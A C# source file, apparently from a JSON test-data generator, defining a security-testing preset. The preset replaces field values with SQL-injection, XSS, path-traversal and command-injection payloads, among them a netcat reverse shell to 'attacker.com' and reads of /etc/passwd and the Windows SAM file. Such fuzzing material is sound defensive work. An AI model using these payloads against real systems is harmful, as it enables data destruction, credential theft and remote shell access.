using BAD.Generator.Configurations;
using Newtonsoft.Json.Linq;

namespace BAD.Presets.Mutations;

/// <summary>
/// Preset con payloads de inyección y caracteres especiales
/// Para testing de seguridad
/// </summary>
public class InjectionPreset : BasePreset
{
    public override string Name => "Inyección/Especiales";
    public override string Description => "Payloads de SQL injection, XSS, path traversal, unicode, etc.";
    public override PresetCategory Category => PresetCategory.Security;

    // Payloads de SQL Injection
    private static readonly string[] SqlInjectionPayloads = 
    {
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1--",
        "1'; DROP TABLE users--",
        "' UNION SELECT * FROM users--",
        "admin'--",
        "1 OR 1=1",
        "' OR ''='",
        "'); DROP TABLE users;--"
    };

    // Payloads de XSS
    private static readonly string[] XssPayloads = 
    {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<input onfocus=alert('XSS') autofocus>"
    };

    // Path Traversal
    private static readonly string[] PathTraversalPayloads = 
    {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg"
    };

    // Unicode y caracteres especiales
    private static readonly string[] UnicodePayloads = 
    {
        "Ṯ̈́ḧ̨́i̧̛̎ś̛̙ ̡̃i̧͋s̨̈́ ̧̀Z̨͋a̛̽l̨͌g̛̈́o̧̽ ̛̈t̨̛ë́x̧̊t̨̄",
        "🔥💀👻🎃",
        "مرحبا بالعالم",
        "你好世界",
        "Привет мир",
        "γειά σου κόσμος",
        "\u0000\u0001\u0002",
        "​", // Zero-width space
        "­", // Soft hyphen
        "‮reversed‬" // Right-to-left override
    };

    // Command Injection
    private static readonly string[] CommandInjectionPayloads = 
    {
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "`whoami`",
        "$(whoami)",
        "|| ping -c 10 localhost",
        "; sleep 10",
        "| nc -e /bin/sh attacker.com 4444"
    };

    // Todos los payloads combinados para strings
    private static readonly string[] AllStringPayloads;

    static InjectionPreset()
    {
        AllStringPayloads = SqlInjectionPayloads
            .Concat(XssPayloads)
            .Concat(PathTraversalPayloads)
            .Concat(UnicodePayloads)
            .Concat(CommandInjectionPayloads)
            .ToArray();
    }

    protected override DefaultValueConfig? CreateConfigForType(string key, JTokenType type, JToken currentValue)
    {
        return type switch
        {
            JTokenType.String => new DefaultValueConfig
            {
                Operation = EnumOperations.Replace,
                TypeDefault = JTokenType.Array,
                Value = AllStringPayloads
            },

            JTokenType.Guid => new DefaultValueConfig
            {
                Operation = EnumOperations.Replace,
                TypeDefault = JTokenType.Array,
                Value = new[] 
                { 
                    "'; DROP TABLE--",
                    "<script>alert(1)</script>",
                    "00000000-0000-0000-0000-000000000000",
                    "../../../etc/passwd"
                }
            },

            // Para tipos numéricos, intentar valores que podrían causar overflow
            JTokenType.Integer => new DefaultValueConfig
            {
                Operation = EnumOperations.Replace,
                TypeDefault = JTokenType.Array,
                Value = new object[] 
                { 
                    int.MaxValue, 
                    int.MinValue, 
                    0,
                    -1,
                    2147483647,
                    -2147483648,
                    999999999999 // Overflow potential
                }
            },

            JTokenType.Float => new DefaultValueConfig
            {
                Operation = EnumOperations.Replace,
                TypeDefault = JTokenType.Array,
                Value = new object[] 
                { 
                    float.PositiveInfinity,
                    float.NegativeInfinity,
                    float.NaN,
                    float.MaxValue,
                    float.MinValue
                }
            },

            JTokenType.Date => new DefaultValueConfig
            {
                Operation = EnumOperations.Replace,
                TypeDefault = JTokenType.Array,
                Value = new[] 
                { 
                    "'; DROP TABLE--",
                    "<script>alert(1)</script>",
                    "9999-99-99",
                    "0000-00-00",
                    "2000-13-32T25:61:61Z"
                }
            },

            _ => null
        };
    }
}
